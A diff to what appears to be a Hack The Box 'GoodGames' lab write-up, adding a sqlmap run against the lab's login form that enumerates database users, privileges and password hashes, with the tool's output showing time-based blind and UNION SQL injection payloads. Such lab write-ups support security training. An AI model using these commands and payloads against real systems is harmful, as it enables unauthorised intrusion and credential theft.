@@ -584,3 +584,64 @@ current user is DBA: False
 [*] ending @ 12:45:27 /2022-12-22/
 
 ```
+
+Checking user privileges; and if we can obtain users and passwords
+```
+[ 12:46PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]                                                                                                                       
+ $ sqlmap -u "http://goodgames.htb/login" --data "email=*&password=*" --privileges --users --passwords                                                                               
+        ___                                                                                                                                                                          
+       __H__                                                                                                                                                                         
+ ___ ___[']_____ ___ ___  {1.6.12#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:49:56 /2022-12-22/
+
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[12:49:58] [INFO] resuming back-end DBMS 'mysql' 
+[12:49:58] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=' AND (SELECT 1612 FROM (SELECT(SLEEP(5)))OMJn) AND 'asXf'='asXf&password=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: email=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7871,0x6556565a707445516e4f50797659665a524c546b464a4b48756462794871444b7955445079645357,0x7178716a71)-- -&passwor
+d=
+---
+[12:49:59] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[12:49:59] [INFO] fetching database users
+got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] n
+database management system users [1]:
+[*] 'main_admin'@'localhost'
+
+[12:50:01] [INFO] fetching database users password hashes
+[12:50:02] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[12:50:03] [WARNING] the SQL query provided does not return any output
+[12:50:03] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[12:50:03] [WARNING] the SQL query provided does not return any output
+[12:50:03] [INFO] fetching database users
+[12:50:03] [INFO] fetching number of password hashes for user 'main_admin'
+[12:50:03] [WARNING] time-based comparison requires larger statistical model, please wait.................. (done)                                                                  
+[12:50:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[12:50:04] [INFO] retrieved: 
+[12:50:05] [WARNING] unable to retrieve the number of password hashes for user 'main_admin'
+[12:50:05] [ERROR] unable to retrieve the password hashes for the database users
+[12:50:05] [INFO] fetching database users privileges
+database management system users privileges:
+[*] 'main_admin'@'localhost' [1]:
+    privilege: USAGE
+
+[12:50:05] [INFO] fetched data logged to text files under '/home/ops/.local/share/sqlmap/output/goodgames.htb'
+
+[*] ending @ 12:50:05 /2022-12-22/
+
+```
